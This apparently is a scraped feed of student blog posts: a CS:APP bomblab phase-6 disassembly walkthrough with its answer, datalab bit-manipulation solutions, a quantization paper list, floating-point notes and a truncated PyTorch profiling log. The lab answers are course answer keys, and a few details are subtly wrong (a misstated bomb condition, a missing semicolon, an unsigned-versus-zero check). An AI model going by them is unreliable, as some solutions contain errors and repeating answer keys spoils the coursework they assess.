\u0026lt;phase_6+0x41\u0026gt; 40114d:\t49 83 c5 04 add $0x4,%r13 401151:\teb c1 jmp 401114 \u0026lt;phase_6+0x20\u0026gt; 401153:\t48 8d 74 24 18 lea 0x18(%rsp),%rsi 401158:\t4c 89 f0 mov %r14,%rax 40115b:\tb9 07 00 00 00 mov $0x7,%ecx 401160:\t89 ca mov %ecx,%edx 401162:\t2b 10 sub (%rax),%edx 401164:\t89 10 mov %edx,(%rax) 401166:\t48 83 c0 04 add $0x4,%rax 40116a:\t48 39 f0 cmp %rsi,%rax 40116d:\t75 f1 jne 401160 \u0026lt;phase_6+0x6c\u0026gt; 40116f:\tbe 00 00 00 00 mov $0x0,%esi 401174:\teb 21 jmp 401197 \u0026lt;phase_6+0xa3\u0026gt; 401176:\t48 8b 52 08 mov 0x8(%rdx),%rdx 40117a:\t83 c0 01 add $0x1,%eax 40117d:\t39 c8 cmp %ecx,%eax 40117f:\t75 f5 jne 401176 \u0026lt;phase_6+0x82\u0026gt; 401181:\teb 05 jmp 401188 \u0026lt;phase_6+0x94\u0026gt; 401183:\tba d0 32 60 00 mov $0x6032d0,%edx 401188:\t48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) 40118d:\t48 83 c6 04 add $0x4,%rsi 401191:\t48 83 fe 18 cmp $0x18,%rsi 401195:\t74 14 je 4011ab \u0026lt;phase_6+0xb7\u0026gt; 401197:\t8b 0c 34 mov (%rsp,%rsi,1),%ecx 40119a:\t83 f9 01 cmp $0x1,%ecx 40119d:\t7e e4 jle 401183 \u0026lt;phase_6+0x8f\u0026gt; 40119f:\tb8 01 00 00 00 mov $0x1,%eax 4011a4:\tba d0 32 60 00 mov $0x6032d0,%edx 4011a9:\teb cb jmp 401176 \u0026lt;phase_6+0x82\u0026gt; 4011ab:\t48 8b 5c 24 20 mov 0x20(%rsp),%rbx 4011b0:\t48 8d 44 24 28 lea 0x28(%rsp),%rax 4011b5:\t48 8d 74 24 50 lea 0x50(%rsp),%rsi 4011ba:\t48 89 d9 mov %rbx,%rcx 4011bd:\t48 8b 10 mov (%rax),%rdx 4011c0:\t48 89 51 08 mov %rdx,0x8(%rcx) 4011c4:\t48 83 c0 08 add $0x8,%rax 4011c8:\t48 39 f0 cmp %rsi,%rax 4011cb:\t74 05 je 4011d2 \u0026lt;phase_6+0xde\u0026gt; 4011cd:\t48 89 d1 mov %rdx,%rcx 4011d0:\teb eb jmp 4011bd \u0026lt;phase_6+0xc9\u0026gt; 4011d2:\t48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) 4011d9:\t00 4011da:\tbd 05 00 00 00 mov $0x5,%ebp 4011df:\t48 8b 43 08 mov 0x8(%rbx),%rax 4011e3:\t8b 00 mov (%rax),%eax 4011e5:\t39 03 cmp %eax,(%rbx) 4011e7:\t7d 05 jge 4011ee \u0026lt;phase_6+0xfa\u0026gt; 4011e9:\te8 4c 02 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 4011ee:\t48 8b 5b 08 mov 0x8(%rbx),%rbx 4011f2:\t83 ed 01 sub $0x1,%ebp 4011f5:\t75 e8 jne 4011df \u0026lt;phase_6+0xeb\u0026gt; 4011f7:\t48 83 c4 50 add $0x50,%rsp 4011fb:\t5b pop %rbx 4011fc:\t5d pop %rbp 4011fd:\t41 5c pop %r12 4011ff:\t41 5d pop %r13 401201:\t41 5e pop %r14 401203:\tc3 retq   我们逐个逐个循环分析这段代码。读入6个整数之后：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  40110b:\t49 89 e6 mov %rsp,%r14 40110e:\t41 bc 00 00 00 00 mov $0x0,%r12d 401114:\t4c 89 ed mov %r13,%rbp 401117:\t41 8b 45 00 mov 0x0(%r13),%eax 40111b:\t83 e8 01 sub $0x1,%eax 40111e:\t83 f8 05 cmp $0x5,%eax 401121:\t76 05 jbe 401128 \u0026lt;phase_6+0x34\u0026gt; 401123:\te8 12 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 401128:\t41 83 c4 01 add $0x1,%r12d 40112c:\t41 83 fc 06 cmp $0x6,%r12d 401130:\t74 21 je 401153 \u0026lt;phase_6+0x5f\u0026gt; 401132:\t44 89 e3 mov %r12d,%ebx 401135:\t48 63 c3 movslq %ebx,%rax 401138:\t8b 04 84 mov (%rsp,%rax,4),%eax 40113b:\t39 45 00 cmp %eax,0x0(%rbp) 40113e:\t75 05 jne 401145 \u0026lt;phase_6+0x51\u0026gt; 401140:\te8 f5 02 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 401145:\t83 c3 01 add $0x1,%ebx 401148:\t83 fb 05 cmp $0x5,%ebx 40114b:\t7e e8 jle 401135 \u0026lt;phase_6+0x41\u0026gt; 40114d:\t49 83 c5 04 add $0x4,%r13 401151:\teb c1 jmp 401114 \u0026lt;phase_6+0x20\u0026gt;   第一个炸弹的触发条件是数组中有数字小于6，第二个是每个数字都不相等。\n1 2 3 4 5 6 7 8 9  401153:\t48 8d 74 24 18 lea 0x18(%rsp),%rsi 401158:\t4c 89 f0 mov %r14,%rax 40115b:\tb9 07 00 00 00 mov $0x7,%ecx 401160:\t89 ca mov %ecx,%edx 401162:\t2b 10 sub (%rax),%edx 401164:\t89 10 mov %edx,(%rax) 401166:\t48 83 c0 04 add $0x4,%rax 40116a:\t48 39 f0 cmp %rsi,%rax 40116d:\t75 f1 jne 401160 \u0026lt;phase_6+0x6c\u0026gt;   这段是将输入的六个值a[i]转换为7 - a[i]。\n后续是复杂的链表排序\u0026hellip;这个有时间再看。答案是：\n1  4 3 2 1 6 5   Reference ","date":"2023-02-11T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/csapp/02-bomblab/","title":"02-bomblab"},{"content":"前言 一直有自学CSAPP的想法，但如果专门报一门课去学的话，一方面和之前的部分培养方案有重叠，划不来；另一方面时间也真的不够充裕。反复思索之下，最终还是采用一种我愿称之为Lab Oriented Studying(LOS，面向实验学习)的方法简单过一遍。具体方法如下：先略读本章内容，然后在做lab的同时针对重点进行强化，同时大量借鉴别人的思路，力求在最短的时间内获得最大的收获。目前的计划是至少做(chao)完datalab、bomblab和attacklab，其他的lab可以先准备基础知识，顺便在OS课上巩固，然后在不(heng)远的将来完成，希望这个饼能实现（我本科已经留下这么多遗憾了，不会连这个小小的计划都把握不住吧x）。\nbitXor 1 2 3 4 5 6 7 8 9 10 11  /* * bitXor - x^y using only ~ and \u0026amp; * Example: bitXor(4, 5) = 1 * Legal ops: ~ \u0026amp; * Max ops: 14 * Rating: 1 */ int bitXor(int x, int y) { return ~(~(x \u0026amp; ~y) \u0026amp; ~(~x \u0026amp; y)); }   since a|b = ~(~a \u0026amp; ~b), a \u0026amp; b = ~(~a | ~b) , so a ^ b = (a \u0026amp; ~b) | (~a \u0026amp; b) = ~(~(a \u0026amp; ~b) \u0026amp; ~(~a \u0026amp; b)).\nand there is a simpler expression using fewer operators: ~(~x\u0026amp;~y)\u0026amp;~(x\u0026amp;y)\ntmin 1 2 3 4 5 6 7 8 9 10  /* * tmin - return minimum two\u0026#39;s complement integer * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 4 * Rating: 1 */ int tmin(void) { return 1 \u0026lt;\u0026lt; 31; }   31 bits 1 is the smallest representation in int32.\nisTmax 1 2 3 4 5 6 7 8 9 10 11  /* * isTmax - returns 1 if x is the maximum, two\u0026#39;s complement number, * and 0 otherwise * Legal ops: ! ~ \u0026amp; ^ | + * Max ops: 10 * Rating: 1 */ int isTmax(int x) { return (!(~(x + (x + 1)))) \u0026amp; (!!(x + 1)); }   To see if x = 0b011111... = 0x7ffffff. 我们将该值记为x_{max}，可以建立这样一个映射：该值会被映射为0/1，而其他值全部被映射为1/0，这样就可以使用简单的逻辑运算符判断。\n首先我们看“如何把x_{max}转换为0”。为了得到“一个32个位上都为0”的数，我们执行以下操作：!~(x + (x + 1))，当x = x_{max}时显然为1。\n之后我们再看“这一映射是否唯一”，上述表达这不能排除一种情况：x = 0xfffffff，对此我们还有一个判断:(x + 1) != 0，使用题中的符号表述就是!!(x + 1)。组合即得。\nallOddBits 1 2 3 4 5 6 7 8 9 10 11 12 13 14  /* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * where bits are numbered from 0 (least significant) to 31 (most significant) * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 12 * Rating: 2 * Note: use value less than 256 */ int allOddBits(int x) { int y = 0xAA + (0xAA\u0026lt;\u0026lt;8) + (0xAA\u0026lt;\u0026lt;16) + (0xAA\u0026lt;\u0026lt;24); return !((x \u0026amp; y) ^ y); }   判断所有的奇数位是否为1。该数应该和0b1010_1010_1010_1010与之后为0。注意x == y等价于!((x \u0026amp; y) ^ y。\nnegate 1 2 3 4 5 6 7 8 9 10 11  /* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 5 * Rating: 2 */ int negate(int x) { return ~x + 1; }   常识，略。\nisAsciiDigit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  /* * isAsciiDigit - return 1 if 0x30 \u0026lt;= x \u0026lt;= 0x39 (ASCII codes for characters \u0026#39;0\u0026#39; to \u0026#39;9\u0026#39;) * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 15 * Rating: 3 */ int isAsciiDigit(int x) { int max_val = ((~0x39) | (1 \u0026lt;\u0026lt; 31)); int min_val = ~0x30; return ((max_val + x) \u0026gt;\u0026gt; 31) \u0026amp; !((min_val + x) \u0026gt;\u0026gt; 31) }   一开始的思路是逐个位地提取‘1’或‘0’，但不太可行，这样很容易就超出了运算符号数限制：\n0x30的二进制形式为0b0011_0000，0x39的二进制形式为0b0011_1001。有以下特点：\n 4~7位一定为0011 0~3位中，在第3位为1的情况下第2和第1位一定为0  对此，可以构造两个数，使得：一个数是加上比0x39大的数后符号由正变负，另一个数是加上比0x30小的值时是负数。可见0x39与最大数相加后应该是0x7fffffff，0x30与最小数相加后应该是0xffffffff。\nconditional 1 2 3 4 5 6 7 8 9 10 11 12 13  /* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 16 * Rating: 3 */ int conditional(int x, int y, int z) { x = !!x; x = ~x+1; return (x \u0026amp; y) | (~x \u0026amp; z); }   我们可以把x这个“条件”转换成一种“掩码”，即一种情况下x为全0，另一种为全1，之后只要与运算一下即可。通过!!x这一运算得到布尔值，然后通过补码运算得到全1或全0。\nisLessOrEqual 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  /* * isLessOrEqual - if x \u0026lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 24 * Rating: 3 */ int isLessOrEqual(int x, int y) { int sign_x = (x \u0026gt;\u0026gt; 31) \u0026amp; 0x1; int sign_y = (y \u0026gt;\u0026gt; 31) \u0026amp; 0x1; int sub = y + (~x + 1); int sign_int = (sub \u0026gt;\u0026gt; 31) \u0026amp; 0x1; return (sign_x \u0026amp; ~sign_y) | (!(~sign_x \u0026amp; sign_y) \u0026amp; !sign_int); }   首先根据negate我们可以用位运算实现减法y - x = y + (~x + 1)。之后需要提取出x和y的符号。此时我们需要考虑4种情况：\n x正y负：x大 x负y正：y大 xy同号：若大于，则符号位为0；若小于，则符号位为1  注意到这里不要用x - y，因为题目中要实现的符号是\u0026lt;=，因此运算结果中的正数和零应该都是等效的。\nlogicalNeg 1 2 3 4 5 6 7 8 9 10 11 12  /* * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 12 * Rating: 4 */ int logicalNeg(int x) { return ((x | (~x + 1)) \u0026gt;\u0026gt; 31) + 1; }   注意到0和0x80000000(最小数)的补码为本身。以及除了0之外，其他数与补码的符号位取位或为1。\nhowManyBits 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  /* howManyBits - return the minimum number of bits required to represent x in * two\u0026#39;s complement * Examples: howManyBits(12) = 5 * howManyBits(298) = 10 * howManyBits(-5) = 4 * howManyBits(0) = 1 * howManyBits(-1) = 1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 90 * Rating: 4 */ int howManyBits(int x) { int sign_x = (x \u0026gt;\u0026gt; 31); x = (sign_x \u0026amp; ~x) | (~sign_x \u0026amp; x); // x \u0026gt;=0 ? x : ~x  int b16, b8, b4, b2, b1, b0; int sum = 0; b16 = !!(x \u0026gt;\u0026gt; 16) \u0026lt;\u0026lt; 4; // 高十六位是否有1  sum = sum + b16; x = x \u0026gt;\u0026gt; b16; // 如果有（至少需要16位），则将原数右移16位。注意我们直接将逻辑值移位得到真实需要的bit数  b8 = !!(x \u0026gt;\u0026gt; 8) \u0026lt;\u0026lt; 3; // 剩余位高8位是否有1  sum = sum + b8; x = x \u0026gt;\u0026gt; b8; // 如果有（至少需要16+8=24位），则右移8位  b4 = !!(x \u0026gt;\u0026gt; 4) \u0026lt;\u0026lt; 2; // 同理  sum = sum + b4; x = x \u0026gt;\u0026gt; b4; b2 = !!(x \u0026gt;\u0026gt; 2) \u0026lt;\u0026lt; 1; sum = sum + b2; x = x \u0026gt;\u0026gt; b2; b1 = !!(x \u0026gt;\u0026gt; 1); sum = sum + b1; x = x \u0026gt;\u0026gt; b1; b0 = x; sum = sum + b0; return sum + 1; //+1表示加上符号位 }   什么意思呢？写出这些数字的二进制表示：\n1 2 3 4 5 6  12 -\u0026gt; 0b0000_0000_000(0_1100) 298 -\u0026gt; 0b0000_00(01_0010_1010) -5 -\u0026gt; 0b1111_1111_1111_(1011) 0 -\u0026gt; 0b0000_0000_0000_000(0) -1 -\u0026gt; 0b1111_1111_1111_111(1) 0x80000000 -\u0026gt; 0b(1000_0000_0000_0000)   如果是一个正数，则需要找到它最高的一位（假设是n）是1的，再加上符号位，结果为n+1；如果是一个负数，则需要知道其最高的一位是0的，再加上符号位。这一逻辑可以很容易地使用循环实现，不过此处无法使用for语句，只好使用一种类似“二分查找”的方法。\n注意到正数和负数的判定特点，此处我们可以将负数直接取反变成正数，判断逻辑一模一样。\nfloatScale2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  /* * floatScale2 - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int\u0026#39;s, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, \u0026amp;\u0026amp;. also if, while * Max ops: 30 * Rating: 4 */ unsigned floatScale2(unsigned uf) { unsigned sign = (uf \u0026amp; 0x80000000) \u0026gt;\u0026gt; 31; unsigned exp = (uf \u0026amp; 0x7f800000) \u0026gt;\u0026gt; 23; unsigned frac = uf \u0026amp; 0x007fffff; unsigned res; if (exp == 0xFF) return uf; else if (exp == 0) { frac \u0026lt;\u0026lt;= 1; res = (sign \u0026lt;\u0026lt; 31) | (exp \u0026lt;\u0026lt; 23) | frac; } else { exp++; res = (sign \u0026lt;\u0026lt; 31) | (exp \u0026lt;\u0026lt; 23) | frac; } return res; }   首先回忆下浮点数的构成： $$ V = (-1)^s \\times M \\times 2^E $$ 规格化时： $$ E = e(e_{k-1}\\cdots e_0) - bias \\ M = 1 + f(f_{k-1}\\cdots0) \\ $$ 非规格化时： $$ E = 1 - bias \\ M = f(f_{k-1}\\cdots0) $$ 对于规格化的情况，我们只需： $$ 2V = (-1)^s \\times M \\times 2^{E+1} $$ 对于非规格化的情况，我们只需： $$ 2V = (-1)^s \\times 2M \\times 2^E \\ (E = 0) $$ 此处考虑一种极端情况：非规格化数乘2之后变为规格化的数，此时M发生“溢出”，溢出的一位自动补在E的最后一位，E=1，根据其解释方法的变化，$2^E$的值实际上是没有变化的，但变换后的$M$等效于之前的$2M$，因此解释方法的变化有利于非规格化到规格化的转变。\n无穷大和NaN直接返回即可。\nfloatFloat2Int 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  /* * floatFloat2Int - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, \u0026amp;\u0026amp;. also if, while * Max ops: 30 * Rating: 4 */ int floatFloat2Int(unsigned uf) { unsigned sign = (uf \u0026amp; 0x80000000) \u0026gt;\u0026gt; 31; unsigned exp = (uf \u0026amp; 0x7f800000) \u0026gt;\u0026gt; 23; unsigned frac = uf \u0026amp; 0x007fffff; unsigned E = exp - 127; if (E \u0026gt;= 0xFF) return 0x80000000u; else if (E \u0026lt; 0) return 0; else { frac = frac | 0x00800000; if (E \u0026gt; 23) frac \u0026lt;\u0026lt;= (E - 23); else frac \u0026gt;\u0026gt;= (23 - E); if (sign) frac = ~frac + 1; return frac; } }   首先考虑特殊情况：如果原浮点值为0则返回0；如果真实指数大于31（frac部分是大于等于1的，1\u0026laquo;31位会覆盖符号位），返回规定的溢出值0x80000000u；如果 exp\u0026lt;0exp\u0026lt;0exp\u0026lt;0 （1右移x位,x\u0026gt;0，结果为0）则返回0。剩下的情况：首先把小数部分（23位）转化为整数（和23比较），然后判断是否溢出：如果和原符号相同则直接返回，否则如果结果为负（原来为正）则溢出返回越界指定值0x80000000u，否则原来为负，结果为正，则需要返回其补码（相反数）。\nfloatPower2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  /* * floatPower2 - Return bit-level equivalent of the expression 2.0^x * (2.0 raised to the power x) for any 32-bit integer x. * * The unsigned value that is returned should have the identical bit * representation as the single-precision floating-point number 2.0^x. * If the result is too small to be represented as a denorm, return * 0. If too large, return +INF. * * Legal ops: Any integer/unsigned operations incl. ||, \u0026amp;\u0026amp;. Also if, while * Max ops: 30 * Rating: 4 */ unsigned floatPower2(int x) { int exp = x + 127; if (exp \u0026lt;= 0) { return 0; } else if (exp \u0026gt;= 0xFF) { return 0x7f800000; } else { return exp \u0026lt;\u0026lt; 23; } }   题目的已知条件相当于告诉了指数位的代表大小，我们首先将其转换为浮点数指数位的形式，然后移位到指定位置，注意判定无穷大的情况。\n 注：c语言在执行右移时，执行的是算数右移还是逻辑右移？对于有符号数来说，执行算数右移；对于无符号数来说，执行逻辑右移。\n1 2 3 4 5 6 7 8 9  #include \u0026lt;stdio.h\u0026gt; int main() { int x = 0xffffffff; unsigned int y = 0xffffffff; printf(\u0026#34;%d\\n\u0026#34;, x \u0026gt;\u0026gt; 31); // -1  printf(\u0026#34;%d\\n\u0026#34;, y \u0026gt;\u0026gt; 31); // 1 }    Reference ","date":"2023-02-09T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/csapp/01-datalab/","title":"01-datalab"},{"content":"Software Algorithms \u0026ndash; Quantization ViT   Post-Training Quantization for Vision Transformer - PKU \u0026amp; Huawei Noah’s Ark Lab, NIPS 2021\n  PTQ4ViT: Post-Training Quantization Framework for Vision Transformers - Houmo AI \u0026amp; PKU, ECCV 2021\n  FQ-ViT: Post-Training Quantization for Fully Quantized Vision Transformer - MEGVII Technology, IJCAI 2022\n  Q-ViT: Fully Differentiable Quantization for Vision Transformer - Megvii Technology \u0026amp; CASIA, arxiv 2022\n  TerViT: An Efficient Ternary Vision Transformer - Beihang University \u0026amp; Shanghai Artificial Intelligence Laboratory, arxiv 2022\n  Patch Similarity Aware Data-Free Quantization for Vision Transformers - CASIA, ECCV 2022\n  PSAQ-ViT V2: Towards Accurate and General Data-Free Quantization for Vision Transformers - CASIA, arxiv 2022\n  BERT   Q8BERT: Quantized 8Bit BERT - Intel AI Lab, NIPS Workshop 2019\n  Ternarybert: Distillation-aware ultra-low bit bert - Huawei Noah’s Ark Lab, EMNLP 2020\n  I-BERT: Integer-only BERT Quantization - University of California, Berkeley, ICML 2021\n  Understanding and Overcoming the Challenges of Efficient Transformer Quantization - Qualcomm AI Research, EMNLP 2021\n  ZeroQuant: Efficient and Affordable Post-Training Quantization for Large-Scale Transformers - Microsoft, arxiv 2022\n  Outlier Suppression: Pushing the Limit of Low-bit Transformer - BUAA \u0026amp; SenseTime \u0026amp; PKU \u0026amp; UESTC, NIPS 2022\n  GPT   Compression of Generative Pre-trained Language Models via Quantization - The University of Hong Kong \u0026amp; Huawei Noah’s Ark Lab, ACL 2022\n  NUQMM: QUANTIZED MATMUL FOR EFFICIENT INFERENCE OF LARGE-SCALE GENERATIVE LANGUAGE MODELS - Pohang University of Science and Technology, arxiv 2022\n  LLM.int8(): 8-bit Matrix Multiplication for Transformers at Scale - University of Washington \u0026amp; FAIR, NIPS 2022\n  SmoothQuant: Accurate and Efficient Post-Training Quantization for Large Language Models - MIT, arxiv 2022\n  GPTQ: ACCURATE POST-TRAINING QUANTIZATION FOR GENERATIVE PRE-TRAINED TRANSFORMERS - IST Austria \u0026amp; ETH Zurich, arxiv 2022\n  The case for 4-bit precision: k-bit Inference Scaling Laws - University of Washington, arxiv 2022\n  Quadapter: Adapter for GPT-2 Quantization - Qualcomm AI Research, arxiv 2022\n  Software Algorithms \u0026ndash; Pruning   A Fast Post-Training Pruning Framework for Transformers - UC Berkeley, arxiv 2022\n  SPARSEGPT: MASSIVE LANGUAGE MODELS CAN BE ACCURATELY PRUNED IN ONE-SHOT - IST Austria, arxiv 2023\n  WHAT MATTERS IN THE STRUCTURED PRUNING OF GENERATIVE LANGUAGE MODELS? - CMU \u0026amp; Microsoft, arxiv 2023\n  ZipLM: Hardware-Aware Structured Pruning of Language Models - IST Austria, arxiv 2023\n  Hardware \u0026amp; System Implementations   Hybrid 8-bit Floating Point (HFP8) Training and Inference for Deep Neural Networks - IBM, NIPS 2019\n  A3: Accelerating Attention Mechanisms in Neural Networks with Approximation - Seoul National University \u0026amp; Hynix, HPCA 2020\n  ELSA: Hardware-Software Co-design for Efficient, Lightweight Self-Attention Mechanism in Neural Networks - Seoul National University, ISCA 2021\n  Accelerating Framework of Transformer by Hardware Design and Model Compression Co-Optimization - ECNU, ICCAD 2022\n  Accelerating attention through gradient-based learned runtime pruning - UCSD \u0026amp; Google, ISCA 2022\n  DeepSpeed Inference: Enabling Efficient Inference of Transformer Models at Unprecedented Scale - Microsoft, arxiv 2022\n  FP8 Quantization: The Power of the Exponent - Qualcomm AI Research, arxiv 2022\n  PETALS: Collaborative Inference and Fine-tuning of Large Models - Yandex, arxiv 2022\n  EFFICIENTLY SCALING TRANSFORMER INFERENCE - Google, arxiv 2022\n  High-throughput Generative Inference of Large Language Models with a Single GPU - Stanford etc., arxiv 2023\n  Platform   EET\n  petals\n  FasterTransformer\n  SmoothQuant\n  FlexGen\n  updating \u0026hellip;\n","date":"2023-02-06T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/awesome-transformer-quantization/readme/","title":"Awesome Transformer Quantization"},{"content":"AMP 混合精度训练 混合精度（Mix Precision）训练是指在训练时，对网络不同的部分采用不同的数值精度，对追求速度的算子（比如 conv、matmul）可以用较低精度（比如 float16）从而获得明显的性能提升，而对其它更看重精度的算子（比如 log、softmax）则保留较高的精度（比如 float32）。另外，模型在内存中用FP16做储存和乘法从而加速计算，而用FP32做累加避免舍入误差。混合精度训练的策略有效地缓解了舍入误差的问题。\n此外，在计算时，其梯度值可能会超出FP16的范围，在这种情况下，将对梯度值进行缩放，使其落在FP16范围内。\n此外还引入损失放大机制，通过放大loss的值来防止梯度的underflow（只在BP时传递梯度信息使用，真正更新权重时还是要把放大的梯度再unscale回去）。\nBF16 BF16由google提出，它在范围上与FP32相同，但精度上有所差异（可以看做FP32的直接截断版，因此与FP32之间的转换要比FP16方便）：\n支持BF16的框架有：\n Google TPUs and Tensorflow. Nvidia CUDA TensorCore Intel Intel Habana Gaudi, Xeon processors (AVX-512 BF16 extensions), and Intel FPGAs Arm ArmV8.6-A AMD AMD ROCm  TF32 TF32（注意只有19bit）在设置上相当于BF16（范围）和FP16（精度）的混合体。\nHFP8 如果直接使用FP8（1-4-3）进行推理，会发现精度的明显降低；而如果用FP8（1-4-3）进行训练会导致更差的后果（因为权值、激活和梯度的数据范围相差很大）。HFP8在forward时使用FP-1-4-3，backward时使用FP-1-5-2。\n我们对其进行更加细致的数值分析，假设指数位为$e$，尾数位为$m$，其公式如下： $$ f = (-1)^s 2^{p-b}(1+\\frac{d_1}{2}+\\cdots + \\frac{d_m}{2^m}), b=2^{e-1}(\\rm adjustable) $$ 直观的讲，对于一个区间$[2^a,2^{a+1}],a\\in Z$来说，间隔长度为$2^{a-m}$。注意这种设置方法在绝对值小时有着较为密集的分布，这对于大多呈正态分布的权重、激活分布有一定的好处。\n这里我们重点介绍下HFP8在Transformer中的应用。NVIDIA的H100支持两种格式的FP8：比如 FP8(1-4-3) 多用于来表示 weights 和 activation，而 FP8(1-5-2) 来表示gradients。其基本架构如下图所示，注意累加后的值仍然为FP32/FP16:\n相比于bit数相同的int8，FP8有以下优点：\n FP8的电路可以和FP16/32的电路进行重用。 int8和FP32的转换需要进行quantize和dequantize，造成额外的开销；而FP8和FP32只需要直接舍掉指数和尾数的精度，不需要进行quantize和dequantize（当然，需要确定合适的指数尾数划分）。  Reference ","date":"2023-02-04T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/hardware-machine-learning/floating-point-num-in-dl/","title":"Floating Point Number in DL"},{"content":"1.2 因此，所谓全盘x化，最终的结果，无一例外都是调和。正如同一个人想要“脱胎换骨，重新做人”，但是无论他多么努力，他也很难逃脱基因对他的限制。\n1.27 问题的关键不在于从事哲学与否，而在于是接受一种廉价的、没有挑战性的替代品、还是试图进行真正的思考。\n2.3 胆小鬼连幸福都会害怕，碰到棉花都会受伤，有时候还被幸福所伤。\n","date":"2023-01-26T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/small_talk/%E6%91%98%E6%8A%84/","title":"摘抄"},{"content":"以下代码测试了pytorch中不同类型的tensor进行乘法运算的速度快慢（[5, 5] * [5 * 10]）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  Wrote profile results to pytorch_type.py.lprof Timer unit: 1e-06 s Total time: 0.000321581 s File: pytorch_type.py Function: fp_32_matmul at line 3 Line # Hits Time Per Hit % Time Line Contents ============================================================== 3 @profile 4 def fp_32_matmul(x, y): 5 1 321.6 321.6 100.0 return torch.matmul(x, y) Total time: 0.000299756 s File: pytorch_type.py Function: int_32_matmul at line 7 Line # Hits Time Per Hit % Time Line Contents ============================================================== 7 @profile 8 def int_32_matmul(x, y): 9 1 251.7 251.7 84.0 x = x.to(torch.int32) 10 1 11.0 11.0 3.7 y = y.to(torch.int32) 11 1 37.0 37.0 12.3 return torch.matmul(x, y) Total time: 3.0522e-05 s File: pytorch_type.py Function: int_16_matmul at line 13 Line # Hits Time Per Hit % Time Line Contents ============================================================== 13 @profile 14 def int_16_matmul(x, y): 15 1 11.2 11.2 36.6 x = x.to(torch.int16) 16 1 7.7 7.7 25.2 y = y.to(torch.int16) 17 1 11.7 11.7 38.3 return torch.matmul(x, y) Total time: 3.5534e-05 s File: pytorch_type.py Function: int_8_matmul at line 19 Line # Hits Time Per Hit % Time Line Contents ============================================================== 19 @profile 20 def int_8_matmul(x, y): 21 1 16.5 16.5 46.3 x = x.to(torch.int8) 22 1 8.0 8.0 22.4 y = y.to(torch.int8) 23 1 11.1 11.1 31.2 return torch.matmul(x, y) Total time: 3.3385e-05 s File: pytorch_type.py Function: uint_8_matmul at line 25 Line # Hits Time Per Hit % Time Line Contents ============================================================== 25 @profile 26 def uint_8_matmul(x, y): 27 1 9.9 9.9 29.7 x = x.to(torch.uint8) 28 1 12.3 12.3 36.9 y = y.to(torch.uint8) 29 1 11.2 11.2 33.4 return torch.matmul(x, y)   看上去整数乘法要比浮点数矩阵乘法快很多。但如果增大矩阵[3, 500, 768] * [768, 768]:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  Wrote profile results to pytorch_type.py.lprof Timer unit: 1e-06 s Total time: 0.0055994 s File: pytorch_type.py Function: fp_32_matmul at line 3 Line # Hits Time Per Hit % Time Line Contents ============================================================== 3 @profile 4 def fp_32_matmul(x, y): 5 1 5599.4 5599.4 100.0 return x @ y Total time: 0.172675 s File: pytorch_type.py Function: int_32_matmul at line 7 Line # Hits Time Per Hit % Time Line Contents ============================================================== 7 @profile 8 def int_32_matmul(x, y): 9 1 937.7 937.7 0.5 x = x.to(torch.int32) 10 1 381.6 381.6 0.2 y = 